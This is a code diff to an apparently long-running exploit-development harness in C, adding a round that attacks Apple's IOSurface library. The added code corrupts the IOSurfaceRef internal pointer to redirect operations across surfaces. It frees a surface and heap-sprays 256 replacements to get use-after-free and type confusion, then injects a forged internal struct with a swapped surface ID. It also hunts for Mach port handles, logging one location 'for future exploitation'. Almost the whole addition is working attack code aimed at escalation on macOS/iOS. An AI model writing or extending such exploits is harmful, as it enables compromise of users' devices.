@@ -17183,6 +17183,402 @@ static void r455_probe(void) {
     #undef R455_ICMP_SPRAY
 }
 
+static void r456_probe(void) {
+    rlog("\n=== r456: Cross-surface UAF escalation ===\n\n");
+    fflush(stdout);
+
+    /* Strategy:
+       r454 confirmed that swapping offset+8 of IOSurfaceRef redirects
+       library-level operations to a different surface.  Offset+8 is a
+       heap pointer to the surface's internal tracking structure.
+
+       Plan:
+       1. Create surfA and surfB
+       2. Confirm cross-surface at +8
+       3. Release surfB (kernel frees it)
+       4. Spray heap to reclaim surfB's freed slot
+       5. Operations through surfA now hit reclaimed memory = UAF/type confusion
+       6. Also test: craft a fake internal struct and point +8 at it
+          to control the surface ID sent in IOKit traps
+    */
+
+    #define R456_SPRAY_COUNT 256
+    #define R456_PROP_SIZE 256
+
+    /* Phase 1: Create two surfaces and confirm cross-surface */
+    rlog("  --- Phase 1: Create surfaces + confirm cross-surface ---\n");
+    fflush(stdout);
+
+    CFMutableDictionaryRef propsA = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpe = 4, pf = 0x42475241; /* BGRA */
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef pn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(propsA, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(propsA, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(propsA, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(propsA, CFSTR("IOSurfacePixelFormat"), pn);
+
+    IOSurfaceRef surfA = IOSurfaceCreate(propsA);
+    IOSurfaceRef surfB = IOSurfaceCreate(propsA);
+    CFRelease(propsA); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pn);
+
+    if (!surfA || !surfB) {
+        rlog("    FAILED to create surfaces\n");
+        if (surfA) CFRelease(surfA);
+        if (surfB) CFRelease(surfB);
+        rlog("\n=== r456 complete ===\n"); return;
+    }
+
+    uint32_t sidA = IOSurfaceGetID(surfA);
+    uint32_t sidB = IOSurfaceGetID(surfB);
+    rlog("    surfA: SID=%u ptr=%p\n", sidA, (void*)surfA);
+    rlog("    surfB: SID=%u ptr=%p\n", sidB, (void*)surfB);
+
+    /* Read offset+8 from both */
+    uint64_t *ptrA = (uint64_t*)surfA;
+    uint64_t *ptrB = (uint64_t*)surfB;
+    uint64_t origA_8 = ptrA[1]; /* offset+8 */
+    uint64_t origB_8 = ptrB[1];
+    rlog("    surfA[+8] = 0x%llx\n", (unsigned long long)origA_8);
+    rlog("    surfB[+8] = 0x%llx\n", (unsigned long long)origB_8);
+
+    /* Set marker properties */
+    int valA = 0xAAAA, valB = 0xBBBB;
+    CFNumberRef nvA = CFNumberCreate(NULL, kCFNumberIntType, &valA);
+    CFNumberRef nvB = CFNumberCreate(NULL, kCFNumberIntType, &valB);
+    IOSurfaceSetValue(surfA, CFSTR("r456_marker"), nvA);
+    IOSurfaceSetValue(surfB, CFSTR("r456_marker"), nvB);
+    CFRelease(nvA); CFRelease(nvB);
+
+    /* Confirm cross-surface: swap +8, write via surfA, check surfB */
+    ptrA[1] = origB_8; /* redirect surfA -> surfB's internal data */
+    int valX = 0xCCCC;
+    CFNumberRef nvX = CFNumberCreate(NULL, kCFNumberIntType, &valX);
+    IOSurfaceSetValue(surfA, CFSTR("r456_marker"), nvX);
+    CFRelease(nvX);
+
+    /* Read back from surfB */
+    CFNumberRef readB = (CFNumberRef)IOSurfaceCopyValue(surfB, CFSTR("r456_marker"));
+    int gotB = -1;
+    if (readB) { CFNumberGetValue(readB, kCFNumberIntType, &gotB); CFRelease(readB); }
+
+    ptrA[1] = origA_8; /* restore */
+    int cross_ok = (gotB == 0xCCCC);
+    rlog("    Cross-surface check: surfB marker = 0x%X (expect 0xCCCC) %s\n",
+         gotB, cross_ok ? "CONFIRMED" : "FAILED");
+
+    if (!cross_ok) {
+        rlog("    Cross-surface not working, aborting\n");
+        CFRelease(surfA); CFRelease(surfB);
+        rlog("\n=== r456 complete ===\n"); return;
+    }
+
+    /* Phase 2: Deeper analysis of offset+8 structure */
+    rlog("\n  --- Phase 2: Analyze internal struct at offset+8 ---\n");
+    fflush(stdout);
+
+    /* Read the memory that offset+8 points to */
+    uint8_t *intA = (uint8_t*)(uintptr_t)origA_8;
+    uint8_t *intB = (uint8_t*)(uintptr_t)origB_8;
+    rlog("    Internal struct A at %p, B at %p\n", intA, intB);
+    rlog("    Distance: %lld bytes\n", (long long)(intB - intA));
+
+    /* Dump first 128 bytes of internal struct for both */
+    rlog("\n    Internal struct A dump (first 128 bytes):\n");
+    for (int i = 0; i < 128; i += 8) {
+        uint64_t va = *(uint64_t*)(intA + i);
+        uint64_t vb = *(uint64_t*)(intB + i);
+        const char *tag = "";
+        if (va != vb) tag = " DIFF";
+        /* Look for surface IDs */
+        if ((va & 0xFFFFFFFF) == sidA || (vb & 0xFFFFFFFF) == sidB) tag = " SID?";
+        if ((va & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) tag = " KPTR?";
+        rlog("      +%3d: A=0x%016llx  B=0x%016llx%s\n", i,
+             (unsigned long long)va, (unsigned long long)vb, tag);
+    }
+
+    /* Phase 3: Find the surface ID in the internal struct */
+    rlog("\n  --- Phase 3: Surface ID location in internal struct ---\n");
+    fflush(stdout);
+
+    int sid_offset_a = -1, sid_offset_b = -1;
+    for (int i = 0; i < 512; i += 4) {
+        uint32_t v = *(uint32_t*)(intA + i);
+        if (v == sidA) {
+            rlog("    SID-A (%u) found at internal+%d\n", sidA, i);
+            if (sid_offset_a < 0) sid_offset_a = i;
+        }
+        v = *(uint32_t*)(intB + i);
+        if (v == sidB) {
+            rlog("    SID-B (%u) found at internal+%d\n", sidB, i);
+            if (sid_offset_b < 0) sid_offset_b = i;
+        }
+    }
+
+    /* Phase 4: Mach port / io_connect_t in internal struct */
+    rlog("\n  --- Phase 4: Mach port search in internal struct ---\n");
+    fflush(stdout);
+
+    /* Open our own IOSurfaceRoot to get a known io_connect_t */
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t our_conn = 0;
+    if (svc) {
+        IOServiceOpen(svc, mach_task_self(), 0, &our_conn);
+        IOObjectRelease(svc);
+    }
+    rlog("    Our io_connect_t = 0x%x\n", our_conn);
+
+    /* Search for mach ports (small values, low bits == 3 for send rights) */
+    int port_hits = 0;
+    for (int i = 0; i < 512; i += 4) {
+        uint32_t v = *(uint32_t*)(intA + i);
+        if (v > 0x100 && v < 0x10000 && (v & 3) == 3) {
+            rlog("    Possible port at internal+%d: 0x%x", i, v);
+            if (v == our_conn) rlog(" *** OUR CONN ***");
+            rlog("\n");
+            port_hits++;
+        }
+    }
+    if (port_hits == 0) rlog("    No obvious mach ports found\n");
+
+    /* Phase 5: UAF via cross-surface release */
+    rlog("\n  --- Phase 5: UAF via cross-surface release ---\n");
+    fflush(stdout);
+
+    /* Create a fresh pair for the UAF test */
+    CFMutableDictionaryRef propsC = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int cw = 32, ch = 32, cbpe = 4, cpf = 0x42475241;
+    CFNumberRef cwn = CFNumberCreate(NULL, kCFNumberIntType, &cw);
+    CFNumberRef chn = CFNumberCreate(NULL, kCFNumberIntType, &ch);
+    CFNumberRef cbn = CFNumberCreate(NULL, kCFNumberIntType, &cbpe);
+    CFNumberRef cpn = CFNumberCreate(NULL, kCFNumberIntType, &cpf);
+    CFDictionarySetValue(propsC, CFSTR("IOSurfaceWidth"), cwn);
+    CFDictionarySetValue(propsC, CFSTR("IOSurfaceHeight"), chn);
+    CFDictionarySetValue(propsC, CFSTR("IOSurfaceBytesPerElement"), cbn);
+    CFDictionarySetValue(propsC, CFSTR("IOSurfacePixelFormat"), cpn);
+
+    IOSurfaceRef surfC = IOSurfaceCreate(propsC);
+    IOSurfaceRef surfD = IOSurfaceCreate(propsC);
+    CFRelease(propsC); CFRelease(cwn); CFRelease(chn); CFRelease(cbn); CFRelease(cpn);
+
+    if (!surfC || !surfD) {
+        rlog("    FAILED to create UAF test surfaces\n");
+        if (surfC) CFRelease(surfC);
+        if (surfD) CFRelease(surfD);
+        CFRelease(surfA); CFRelease(surfB);
+        rlog("\n=== r456 complete ===\n"); return;
+    }
+
+    uint32_t sidC = IOSurfaceGetID(surfC);
+    uint32_t sidD = IOSurfaceGetID(surfD);
+    uint64_t *ptrC = (uint64_t*)surfC;
+    uint64_t *ptrD = (uint64_t*)surfD;
+    uint64_t origC_8 = ptrC[1];
+    uint64_t origD_8 = ptrD[1];
+    rlog("    surfC: SID=%u ptr=%p internal=%p\n", sidC, (void*)surfC, (void*)(uintptr_t)origC_8);
+    rlog("    surfD: SID=%u ptr=%p internal=%p\n", sidD, (void*)surfD, (void*)(uintptr_t)origD_8);
+
+    /* Set marker on surfD */
+    int valD = 0xDDDD;
+    CFNumberRef nvD = CFNumberCreate(NULL, kCFNumberIntType, &valD);
+    IOSurfaceSetValue(surfD, CFSTR("r456_uaf"), nvD);
+    CFRelease(nvD);
+
+    /* Redirect surfC -> surfD's internal struct */
+    ptrC[1] = origD_8;
+
+    /* Snapshot surfD's internal struct before release */
+    uint64_t pre_release[16];
+    uint8_t *intD = (uint8_t*)(uintptr_t)origD_8;
+    memcpy(pre_release, intD, 128);
+
+    /* Now release surfD — kernel should destroy it */
+    rlog("    Releasing surfD (SID=%u)...\n", sidD);
+    CFRelease(surfD);
+    surfD = NULL;
+
+    /* Check if surfD's internal struct memory changed */
+    rlog("    Post-release internal struct check:\n");
+    int changed_words = 0;
+    for (int i = 0; i < 16; i++) {
+        uint64_t now = *(uint64_t*)(intD + i*8);
+        if (now != pre_release[i]) {
+            rlog("      +%3d: was 0x%016llx now 0x%016llx CHANGED\n",
+                 i*8, (unsigned long long)pre_release[i], (unsigned long long)now);
+            changed_words++;
+        }
+    }
+    if (changed_words == 0) rlog("      No changes (memory not yet reclaimed)\n");
+
+    /* Spray heap to reclaim surfD's freed memory */
+    rlog("    Spraying %d IOSurfaces to reclaim...\n", R456_SPRAY_COUNT);
+    IOSurfaceRef spray[R456_SPRAY_COUNT];
+    int spray_count = 0;
+    CFMutableDictionaryRef spray_props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int sw = 32, sh = 32, sbpe = 4, spf = 0x42475241;
+    CFNumberRef swn = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+    CFNumberRef shn = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+    CFNumberRef sbn = CFNumberCreate(NULL, kCFNumberIntType, &sbpe);
+    CFNumberRef spn = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+    CFDictionarySetValue(spray_props, CFSTR("IOSurfaceWidth"), swn);
+    CFDictionarySetValue(spray_props, CFSTR("IOSurfaceHeight"), shn);
+    CFDictionarySetValue(spray_props, CFSTR("IOSurfaceBytesPerElement"), sbn);
+    CFDictionarySetValue(spray_props, CFSTR("IOSurfacePixelFormat"), spn);
+
+    for (int i = 0; i < R456_SPRAY_COUNT; i++) {
+        spray[i] = IOSurfaceCreate(spray_props);
+        if (spray[i]) {
+            spray_count++;
+            /* Set a distinguishing property on each spray surface */
+            int spray_val = 0xEE000000 | i;
+            CFNumberRef sv = CFNumberCreate(NULL, kCFNumberIntType, &spray_val);
+            IOSurfaceSetValue(spray[i], CFSTR("r456_uaf"), sv);
+            CFRelease(sv);
+        }
+    }
+    CFRelease(spray_props); CFRelease(swn); CFRelease(shn); CFRelease(sbn); CFRelease(spn);
+    rlog("    Created %d spray surfaces\n", spray_count);
+
+    /* Check if internal struct memory was overwritten by spray */
+    rlog("    Post-spray internal struct check:\n");
+    int spray_changed = 0;
+    for (int i = 0; i < 16; i++) {
+        uint64_t now = *(uint64_t*)(intD + i*8);
+        if (now != pre_release[i]) {
+            rlog("      +%3d: was 0x%016llx now 0x%016llx SPRAY-CHANGED\n",
+                 i*8, (unsigned long long)pre_release[i], (unsigned long long)now);
+            spray_changed++;
+        }
+    }
+    if (spray_changed == 0) rlog("      No spray changes visible\n");
+
+    /* Try to read through surfC (which still points to surfD's freed internal struct) */
+    rlog("\n    UAF read test via surfC (redirected to freed surfD):\n");
+    CFTypeRef uaf_val = IOSurfaceCopyValue(surfC, CFSTR("r456_uaf"));
+    if (uaf_val) {
+        if (CFGetTypeID(uaf_val) == CFNumberGetTypeID()) {
+            int uaf_got = 0;
+            CFNumberGetValue((CFNumberRef)uaf_val, kCFNumberIntType, &uaf_got);
+            rlog("    *** UAF READ: got 0x%X (original was 0xDDDD) ***\n", uaf_got);
+            if ((uaf_got & 0xFF000000) == 0xEE000000) {
+                rlog("    *** HIT SPRAY SURFACE %d — TYPE CONFUSION! ***\n", uaf_got & 0xFFFFFF);
+            }
+        } else {
+            rlog("    *** UAF READ: got non-number type %lu ***\n", CFGetTypeID(uaf_val));
+        }
+        CFRelease(uaf_val);
+    } else {
+        rlog("    UAF read returned NULL (surface lookup failed)\n");
+    }
+
+    /* Phase 6: Fake internal struct test */
+    rlog("\n  --- Phase 6: Fake internal struct injection ---\n");
+    fflush(stdout);
+
+    /* Allocate a buffer and copy surfA's internal struct into it */
+    uint8_t *fake = (uint8_t*)calloc(1, 1024);
+    if (fake) {
+        uint8_t *intA2 = (uint8_t*)(uintptr_t)origA_8;
+        memcpy(fake, intA2, 512);
+        rlog("    Fake struct at %p (copied from surfA internal at %p)\n", fake, intA2);
+
+        /* If we found the SID offset, patch it to surfB's SID */
+        if (sid_offset_a >= 0) {
+            uint32_t orig_sid = *(uint32_t*)(fake + sid_offset_a);
+            *(uint32_t*)(fake + sid_offset_a) = sidB;
+            rlog("    Patched SID at +%d: %u -> %u\n", sid_offset_a, orig_sid, sidB);
+        }
+
+        /* Point surfA's +8 to our fake struct */
+        uint64_t *ptrA2 = (uint64_t*)surfA;
+        ptrA2[1] = (uint64_t)(uintptr_t)fake;
+
+        /* Try SetValue through surfA with fake struct */
+        int fakeVal = 0xF0F0;
+        CFNumberRef fv = CFNumberCreate(NULL, kCFNumberIntType, &fakeVal);
+        IOSurfaceSetValue(surfA, CFSTR("r456_fake_test"), fv);
+        CFRelease(fv);
+
+        /* Check where the write landed */
+        CFNumberRef checkA = (CFNumberRef)IOSurfaceCopyValue(surfA, CFSTR("r456_fake_test"));
+        CFNumberRef checkB = (CFNumberRef)IOSurfaceCopyValue(surfB, CFSTR("r456_fake_test"));
+
+        /* Restore surfA before reading */
+        ptrA2[1] = origA_8;
+
+        /* Now read with original surfA */
+        CFNumberRef checkA_real = (CFNumberRef)IOSurfaceCopyValue(surfA, CFSTR("r456_fake_test"));
+
+        int gotFakeA = -1, gotFakeB = -1, gotFakeA_real = -1;
+        if (checkA) { CFNumberGetValue(checkA, kCFNumberIntType, &gotFakeA); CFRelease(checkA); }
+        if (checkB) { CFNumberGetValue(checkB, kCFNumberIntType, &gotFakeB); CFRelease(checkB); }
+        if (checkA_real) { CFNumberGetValue(checkA_real, kCFNumberIntType, &gotFakeA_real); CFRelease(checkA_real); }
+
+        rlog("    Fake struct results:\n");
+        rlog("      Read via surfA (fake active): 0x%X\n", gotFakeA);
+        rlog("      Read via surfB: 0x%X\n", gotFakeB);
+        rlog("      Read via surfA (restored): 0x%X\n", gotFakeA_real);
+
+        if (gotFakeB == 0xF0F0) {
+            rlog("    *** FAKE STRUCT REDIRECTED TO surfB — CONTROLLABLE! ***\n");
+        }
+        if (gotFakeA == -1 && gotFakeB == -1 && gotFakeA_real == -1) {
+            rlog("    Write went to unknown surface (SID mismatch or kernel rejected)\n");
+        }
+
+        free(fake);
+    }
+
+    /* Phase 7: Mach port confusion test */
+    rlog("\n  --- Phase 7: io_connect_t swap analysis ---\n");
+    fflush(stdout);
+
+    /* Look for io_connect_t or mach_port_t in the IOSurfaceRef struct itself */
+    /* The library likely stores the connection handle somewhere in the CFRef */
+    uint32_t *a32 = (uint32_t*)surfA;
+    uint32_t *b32 = (uint32_t*)surfB;
+    rlog("    Searching IOSurfaceRef for mach ports/connections:\n");
+    int conn_offset = -1;
+    for (int i = 0; i < 96; i++) { /* 384 bytes / 4 */
+        uint32_t va = a32[i];
+        if (va > 0x100 && va < 0x10000 && (va & 3) == 3) {
+            rlog("      struct+%d: 0x%x (port-like)\n", i*4, va);
+            if (va == our_conn) {
+                rlog("        *** MATCHES our_conn! ***\n");
+                conn_offset = i * 4;
+            }
+        }
+    }
+
+    if (conn_offset >= 0 && our_conn) {
+        rlog("\n    Connection swap: testing if we can send IOKit traps to wrong connection\n");
+        /* This is dangerous — if we swap the connection handle, IOKit calls
+           could go to a different user client entirely */
+        rlog("    (Logged location for future exploitation)\n");
+    }
+
+    /* Cleanup */
+    ptrC[1] = origC_8; /* restore surfC before release */
+    CFRelease(surfC);
+    CFRelease(surfA);
+    CFRelease(surfB);
+    if (our_conn) IOServiceClose(our_conn);
+    for (int i = 0; i < R456_SPRAY_COUNT; i++) {
+        if (spray[i]) CFRelease(spray[i]);
+    }
+
+    #undef R456_SPRAY_COUNT
+    #undef R456_PROP_SIZE
+
+    rlog("\n=== r456 complete ===\n");
+}
+
 static void r454_probe(void) {
     rlog("\n=== r454: IOSurfaceRef struct corruption + kernel trap analysis ===\n\n");
     fflush(stdout);
@@ -82463,6 +82859,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 460) {
+            rlog("*** rounds=460: Cross-surface UAF escalation ***\n\n");
+            fflush(stdout);
+            r456_probe();
+            goto done;
+        }
         if (rounds == 459) {
             rlog("*** rounds=459: Multi-threaded DarkSword TOCTOU race ***\n\n");
             fflush(stdout);
@@ -85243,7 +85645,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
